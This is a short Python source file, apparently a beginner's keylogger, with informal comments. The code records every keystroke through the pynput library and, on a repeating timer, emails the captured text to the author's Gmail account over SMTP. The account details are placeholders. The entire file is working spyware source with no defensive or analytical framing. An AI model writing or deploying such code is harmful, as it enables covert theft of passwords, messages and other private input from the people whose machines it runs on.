#!/usr/bin/env python
import pynput.keyboard                        # =====> import modul keyboard from liberally
from pynput.keyboard import Key
import threading                              # ====> run more one process at the same time
import smtplib
log = " "

class Keylogger:

    def process_key_press(self, key):
        global log
        try:                                     # ===> try to execute this code as a normal
            log = log + str(key.char)
        except AttributeError:                  # ===> execute this code when makes an error in try ( when i press spacial char)
            if key == Key.space:
                log = log + " "
            elif key == Key.enter:
                log = log + " enter "
            elif key == Key.backspace:
                log = log + " delete "
            else:
                log = log + " " + str(key) + " "

    def send_mail(self, email, passwd, message):  # =====> fun sen mail to me
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, passwd)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):                        # send me report after range of time
        global log
        print(log)
        self.send_mail("your mail", "your passwd", log)
        log = " "
        timer = threading.Timer(50, self.report )                 # call fun report after each 5 sec
        timer.start()                                               # start counter

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)       # ====> when i press any key go to this function
        with keyboard_listener:# ===> ensure program safe run
            self.report()
            keyboard_listener.join()                                                   # ===> ensure program is always working










